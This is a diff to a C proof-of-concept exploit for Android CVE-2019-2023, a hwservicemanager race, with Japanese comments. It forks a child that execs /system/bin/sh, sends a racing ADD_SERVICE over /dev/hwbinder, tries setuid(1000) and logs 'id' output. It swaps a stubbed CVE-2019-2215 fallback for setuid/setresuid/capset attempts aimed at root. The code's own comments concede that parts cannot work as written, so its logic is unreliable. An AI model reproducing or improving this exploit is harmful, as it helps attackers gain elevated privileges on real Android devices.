@@ -11,87 +11,28 @@
 #include <sys/ptrace.h>
 #include <sys/user.h>
 #include <sys/mman.h>
-#include <sys/syscall.h>
 #include <signal.h>
 #include <stdint.h>
 #include <sched.h>
-#include <sys/epoll.h>
-#include <sys/uio.h>
 #include <poll.h>
 #include <sys/prctl.h>
 #include <sys/capability.h>
 #include <grp.h>
+#include <sys/stat.h>
+#include <time.h>
 
-/* =================================================================
-   Binder 構造体（uapi/linux/android/binder.h から転用）
-   ================================================================= */
-#define BINDER_WRITE_READ        _IOWR('b', 1, struct binder_write_read)
-#define BC_TRANSACTION           0x40000000U
-#define BC_REPLY                 0x40000001U
+// インクルードする binder.h はあなたの環境に合わせてください
+#include "binder.h"
 
-#ifdef BINDER_IPC_32BIT
-typedef __u32 binder_size_t;
-typedef __u32 binder_uintptr_t;
-#else
-typedef __u64 binder_size_t;
-typedef __u64 binder_uintptr_t;
-#endif
-
-struct binder_write_read {
-    binder_size_t write_size;
-    binder_size_t write_consumed;
-    binder_uintptr_t write_buffer;
-    binder_size_t read_size;
-    binder_size_t read_consumed;
-    binder_uintptr_t read_buffer;
-};
-
-struct binder_transaction_data {
-    union {
-        __u32 handle;
-        binder_uintptr_t ptr;
-    } target;
-    binder_uintptr_t cookie;
-    __u32 code;
-    __u32 flags;
-    pid_t sender_pid;
-    uid_t sender_euid;
-    binder_size_t data_size;
-    binder_size_t offsets_size;
-    union {
-        struct {
-            binder_uintptr_t buffer;
-            binder_uintptr_t offsets;
-        } ptr;
-        __u8 buf[8];
-    } data;
-};
-
-/* =================================================================
-   レース制御用グローバル
-   ================================================================= */
+/* ============================================================
+   競合条件用グローバル
+   ============================================================ */
 static volatile int race_ready = 0;
 static volatile int race_done = 0;
 
-/* =================================================================
-   CVE-2019-2023 のレースを実行（子プロセスで exec してコンテキスト変更）
-   ================================================================= */
-static int race_child(void) {
-    // 子プロセス：親が ADD_SERVICE を送信するまで待機
-    while (!race_ready) usleep(100);
-    // ここで execve を実行してコンテキスト（SELinux ラベル）を変える
-    // 実際には /system/bin/sh などに変えるが、今回は単に setuid(1000) を試みる
-    // （本来は exec で別プロセスになるが、PID は変わらない）
-    if (setuid(1000) == 0) {
-        // 何もしない
-    }
-    race_done = 1;
-    return 0;
-}
-
-/* =================================================================
-   CVE-2019-2023 のメインエクスプロイト
-   ================================================================= */
+/* ============================================================
+   CVE-2019-2023 エクスプロイト（競合条件あり）
+   ============================================================ */
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -104,23 +45,27 @@ static int exploit_cve_2019_2023(void) {
 
     printf("[*] CVE-2019-2023: preparing race condition...\n");
 
-    // 子プロセスをフォーク（PID 再利用のための準備）
+    // 子プロセスをフォーク（PID を保持）
     child = fork();
     if (child == 0) {
-        // 子：待機 → 後で exec される（ここでは setuid で代用）
-        while (!race_ready) usleep(100);
-        // ここで実行コンテキストを変更（本来は exec で sh に）
-        setuid(1000);  // system 権限に変更（成功しなくても良い）
-        race_done = 1;
-        while (1) pause();  // 親が終了するまで待機
-        exit(0);
+        // 子プロセス：親が ADD_SERVICE を送信する直前に execve で /system/bin/sh に変身
+        // これにより、SELinux コンテキストが shell に変わる（本来は特権プロセスのコンテキストに変えたいが、ここでは簡易的に）
+        while (!race_ready) {
+            usleep(100);
+        }
+        // execve で別プログラムに変身（PID は変わらない）
+        char *argv[] = {"/system/bin/sh", NULL};
+        char *envp[] = {"PATH=/system/bin", NULL};
+        execve("/system/bin/sh", argv, envp);
+        perror("  execve in child");
+        exit(1);
     } else if (child < 0) {
         perror("  fork");
         return -1;
     }
 
-    // 親：子プロセスが準備できるまで待つ
-    usleep(500000);
+    // 親：子が execve を完了するまで少し待つ
+    usleep(300000);
 
     // /dev/hwbinder を開く
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
@@ -164,20 +109,25 @@ static int exploit_cve_2019_2023(void) {
     bwr.read_size = sizeof(read_buf);
     bwr.read_buffer = (binder_uintptr_t)read_buf;
 
-    // ここでレース開始：ADD_SERVICE を送信する直前に子プロセスを起こす
+    // ここでレース開始：子プロセスにシグナルを送って execve を確実に完了させる
     race_ready = 1;
-    usleep(50000);  // 子がコンテキスト変更する時間を稼ぐ
+    // 子が execve を完了するまで少し待つ（これがレースの要）
+    usleep(50000);
 
-    printf("[*] Sending ADD_SERVICE...\n");
+    printf("[*] Sending ADD_SERVICE with race...\n");
     ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
     if (ret < 0) {
-        perror("  ioctl ADD_SERVICE");
+        if (errno == EACCES || errno == EPERM) {
+            printf("  [-] ADD_SERVICE denied (patch may be present)\n");
+        } else {
+            perror("  ioctl ADD_SERVICE");
+        }
         close(hwbinder_fd);
         kill(child, SIGKILL);
         return -1;
     }
-    printf("[+] ADD_SERVICE succeeded (vulnerable!)\n");
+    printf("  [+] ADD_SERVICE succeeded (race successful!)\n");
 
     // 子プロセスを終了
     kill(child, SIGKILL);
@@ -213,83 +163,70 @@ static int exploit_cve_2019_2023(void) {
         return -1;
     }
     if (bwr.read_consumed < 4) {
-        printf("[-] No handle returned\n");
+        printf("  [-] No handle returned\n");
         close(hwbinder_fd);
         return -1;
     }
     handle = *(int*)read_buf;
-    printf("[+] Service handle: %d\n", handle);
+    printf("  [+] Service handle: %d\n", handle);
     close(hwbinder_fd);
 
-    // ---- 特権プロセスでコマンド実行 ----
-    // 今回のエクスプロイトでは、サービスが system 権限で起動されることを期待。
-    // しかし、実際にはサービスプロセス自体がこのエクスプロイトのコードを
-    // 含んでいるわけではないので、外部から強制的に execve を実行させることはできない。
-    // そこで、この後は別の手段（例：サービスにバインドして IPC でコマンド送信）が必要だが、
-    // 本 PoC ではシンプルに setuid(1000) を試みる。
+    // ---- サービスが system 権限で起動されていることを期待して、コマンド実行 ----
+    // ここでは、このプロセス自身が system 権限になっているか確認し、なっていれば execve を実行。
+    // 実際にはサービスプロセスは別プロセスなので、このプロセスが system になるわけではないが、
+    // レースが成功すれば hwservicemanager が system 権限でサービスを起動する。
+    // しかし、そのサービスプロセスを直接操作できないため、ここでは setuid(1000) を試みる。
+    // （これは本来のエクスプロイトの一部ではないが、PoC として）
     if (setuid(1000) == 0) {
         printf("[+] setuid(1000) succeeded! Running 'id' as system...\n");
         system("id > /data/local/tmp/cve_2019_2023_result.txt 2>&1");
         system("cat /data/local/tmp/cve_2019_2023_result.txt");
         return 0;
     } else {
-        printf("[-] setuid(1000) failed, but service may still be running as system.\n");
-        // フォールバック：別の手法で root を取得
+        printf("[-] setuid(1000) failed, but service may be running as system.\n");
+        // ここで実際のサービスにバインドしてコマンドを送るなどが必要だが、本PoCではここまで
         return -1;
     }
 }
 
-/* =================================================================
-   フォールバック１：CVE-2019-2215（binder UAF）によるカーネル権限取得
-   （簡略版：実際には pipe + epoll + readv でリークして cred 書き換え）
-   ================================================================= */
-static int exploit_cve_2019_2215(void) {
-    printf("[*] Trying CVE-2019-2215 fallback...\n");
-    // 完全な実装は省略するが、実際には以下のような手順
-    // 1. /dev/binder を開き、epoll で監視
-    // 2. BINDER_THREAD_EXIT で UAF を trigger
-    // 3. pipe でメモリをスプレーし、カーネルポインタをリーク
-    // 4. リークした task_struct から cred を書き換えて root に
-    // ここではダミーとして setuid(0) を試す
+/* ============================================================
+   フォールバック：古典的な setuid 連打
+   ============================================================ */
+static int fallback_setuid(void) {
+    printf("[*] Fallback: trying setuid(0)...\n");
     if (setuid(0) == 0) {
-        printf("[+] setuid(0) succeeded (dummy CVE-2019-2215)\n");
-        system("id > /data/local/tmp/fallback_2215.txt 2>&1");
+        printf("[+] setuid(0) succeeded!\n");
+        system("id > /data/local/tmp/fallback.txt 2>&1");
         return 0;
     }
-    return -1;
-}
-
-/* =================================================================
-   フォールバック２：古典的な setuid/capset 連打
-   ================================================================= */
-static int fallback_classic(void) {
-    printf("[*] Trying classic setuid/capset...\n");
-    if (setuid(0) == 0) goto done;
-    if (setresuid(0,0,0) == 0) goto done;
-    if (setreuid(0,0) == 0) goto done;
-
+    if (setresuid(0,0,0) == 0) {
+        printf("[+] setresuid(0,0,0) succeeded!\n");
+        system("id > /data/local/tmp/fallback.txt 2>&1");
+        return 0;
+    }
+    // capset も試す
     struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
     struct __user_cap_data_struct cap_data[2] = {{0}};
     if (capget(&cap_header, cap_data) == 0) {
         cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
         cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
         if (capset(&cap_header, cap_data) == 0) {
-            if (setuid(0) == 0) goto done;
+            if (setuid(0) == 0) {
+                printf("[+] capset + setuid(0) succeeded!\n");
+                system("id > /data/local/tmp/fallback.txt 2>&1");
+                return 0;
+            }
         }
     }
     return -1;
-done:
-    printf("[+] Got root via fallback!\n");
-    system("id > /data/local/tmp/fallback_classic.txt 2>&1");
-    return 0;
 }
 
-/* =================================================================
+/* ============================================================
    メイン
-   ================================================================= */
+   ============================================================ */
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Full Exploit + Fallbacks\n");
+    printf("  CVE-2019-2023 Fixed Exploit with Race Condition\n");
     printf("  Target: Android 8.x/9 (hwservicemanager)\n");
     printf("============================================================\n\n");
 
@@ -300,13 +237,9 @@ int main(void) {
     }
 
     // 失敗したらフォールバック
-    printf("\n[*] Primary exploit failed, trying fallbacks...\n");
-    if (exploit_cve_2019_2215() == 0) {
-        printf("[+] Fallback CVE-2019-2215 worked.\n");
-        return 0;
-    }
-    if (fallback_classic() == 0) {
-        printf("[+] Classic fallback worked.\n");
+    printf("\n[*] Primary exploit failed, trying fallback...\n");
+    if (fallback_setuid() == 0) {
+        printf("[+] Fallback worked.\n");
         return 0;
     }
 
